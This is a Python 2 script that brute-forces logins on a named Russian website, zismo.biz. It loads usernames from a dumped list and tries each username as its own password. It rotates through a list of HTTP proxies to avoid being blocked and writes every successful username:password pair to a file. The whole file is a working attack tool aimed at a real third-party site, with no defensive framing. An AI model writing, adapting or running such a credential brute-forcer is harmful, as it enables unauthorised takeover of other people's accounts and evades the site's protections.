import sys, random, re
from threading import Thread
from grab import Grab, GrabError
from Queue import Queue
reload(sys)
sys.setdefaultencoding("utf-8")
# Define some globals
# 
loginFile = 'dump2.lst'
plFile = 'proxy.lst'
loginFoundFilepath = 'login_found.txt'
savedProxy = ''
useProxy = False
successfulLoginText = u'/template/images/to_forum_button.png'
changeProxyText = u'url(http://zismo.ru/plan_ru/error404.jpeg)'
g = Grab()
g.setup(hammer_mode=False)
g.setup(headers={'Connection': 'Keep-Alive'})
connectTimeout = 5
timeout = 10
# 
# Globals end

# Open file with proxy and read lines from it
# Returns pl tulup
def loadFile(readFilePath=''):
		readFile = open(readFilePath, 'r')
		fileContent = readFile.readlines()
		readFile.close()
		return fileContent

# Appends str to file
def appendFile(appendFilePath='', string=''):
	appendFile = open(appendFilePath, 'a')
	appendFile.write(str(string) + '\n')
	appendFile.close()

# Remove \n 
def clearString(string='foo'):
	rs = string.replace('\n','')
	return rs

# Remove spaces
def removeSpaces(string='foo '):
	return re.sub("^\s+|\n|\r|\s+$", '', string)

# Returns a random proxy
def getNext(pl):
	proxy = clearString(random.choice(pl))
	return proxy if proxy else removeBad(pl, proxy) 

# Removes bad proxy
def removeBad(pl, bad):
	if str(bad)+'\n' in pl:
		pl.remove(str(bad)+'\n')
		print '>>> Proxy '+bad+' removed, '+str(len(pl))+' proxies left!'
	# If no proxy left, reload proxy list
	if not pl:
		reloadPL(plFile)

# Reloads a proxy list
def reloadPL(plFile):
	global pl
	pl = loadFile(plFile)

# Saves a proxy
def saveProxy(saveVariable):
	global savedProxy
	savedProxy = saveVariable

# Gets a proxy
def getAproxy(pl):
	return getNext(pl) if not savedProxy else savedProxy

# Creates request and check response
def brute(username, passwd):
	# Fill uname and pass
	g.setup(post= {'user': username, 'password': passwd, 'sbm': '%D0%92%D0%BE%D0%B9%D1%82%D0%B8','a': 2})
	# If we need to use a proxy
	proxyForRequest = getAproxy(pl)	
	if useProxy:
		g.setup(proxy=proxyForRequest, proxy_type='http', connect_timeout=connectTimeout, timeout=timeout)		
	try:  
		# Sending request                              
		g.go('http://zismo.biz/index/sub/')
		#if int(g.response.code) != 200:
		# If we shoudn't change proxy
		if not g.search(changeProxyText):
        	# If we found a login
			if g.search(successfulLoginText):
				appendFile(loginFoundFilepath, username+':'+passwd)	
				print '!!! Login found '+username+':'+passwd
           	# If a login attempt failed
			else:
				saveProxy(getNext(pl))
				bruteAgain(username, passwd)
				print '>>> Login attempt failed for '+username+':'+passwd
		else:
			removeBad(pl, proxyForRequest)
			print '>>> Change proxy'
			bruteAgain(username, passwd)
    # Network error, dead proxy, connection timeout
	except GrabError:
		removeBad(pl, proxyForRequest)
		bruteAgain(username, passwd)

def bruteAgain(username, passwd):
	global useProxy
	# Brute again with next proxy
	saveProxy(getNext(pl))
	useProxy = True
	brute(username, passwd)

# Main function
# Loading proxy list
pl = loadFile(plFile)
# Loading users list
ul = loadFile(loginFile)
# Iterate each login and brute it
try: 
	for username in ul:
		uname = removeSpaces(clearString(username))
		if uname:
			brute(uname, uname)
except KeyboardInterrupt:
	sys.quit()

